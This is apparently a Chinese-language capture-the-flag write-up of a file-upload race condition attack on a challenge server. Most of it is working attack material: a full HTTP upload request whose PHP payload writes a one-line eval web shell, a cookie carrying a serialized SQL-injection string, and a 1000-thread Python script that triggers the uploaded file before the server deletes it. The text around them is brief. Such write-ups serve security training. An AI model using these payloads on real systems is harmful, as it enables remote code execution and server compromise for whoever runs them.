大概就是条件竞争上传，诱发原因是先上传再删除。

条件竞争原理：我们成功上传了php文件，服务端会在短时间内将其删除，我们需要抢到在它删除之前访问文件并生成一句话木马文件，所以访问包的线程需要稍微大于上传包的线程。

然后用bp发包（设置一个线程）

```php
POST /upload.php HTTP/1.1
Host: 61.147.171.105:49644
Content-Length: 275
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:49644
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQyWgb3oDSJcxO1ze
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://61.147.171.105:49644/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1693809419; last_login_info=YToyOntzOjI6ImlwIjtzOjE0OiIxMjMuMTIzLjEyMy4yMyI7czozOiJzcWwiO086MzoiU1FMIjozOntzOjU6InRhYmxlIjtzOjU6InVzZXJzIjtzOjg6InVzZXJuYW1lIjtzOjEyOiJhZG1pbicgb3IgJzEiO3M6ODoicGFzc3dvcmQiO3M6MToiMSI7fX0=
Connection: close

------WebKitFormBoundaryQyWgb3oDSJcxO1ze
Content-Disposition: form-data; name="file"; filename="2.php"
Content-Type: application/octet-stream

<?php 
fputs(fopen("heihei.php", "w"), '<?php @eval($_POST["heihei"]); ?>'); 
?>
------WebKitFormBoundaryQyWgb3oDSJcxO1ze--

```

再用python访问这个地点

```python
import requests
import threading
import os


class RaceCondition(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

        self.url = 'http://61.147.171.105:49644/upload/2.php'

    def _get(self):
        print('try to call uploaded file...')
        r = requests.get(self.url)
        if r.status_code == 200:
            print(r.text)
            os._exit(0)

    def run(self):
        while True:
            for i in range(5):
                self._get()

            for i in range(10):
                self._get()


if __name__ == '__main__':
    threads = 1000

    for i in range(threads):
        t = RaceCondition()
        t.start()

    for i in range(threads):
        t.join()
```

然后即可赶在删除前逮捕他获取flag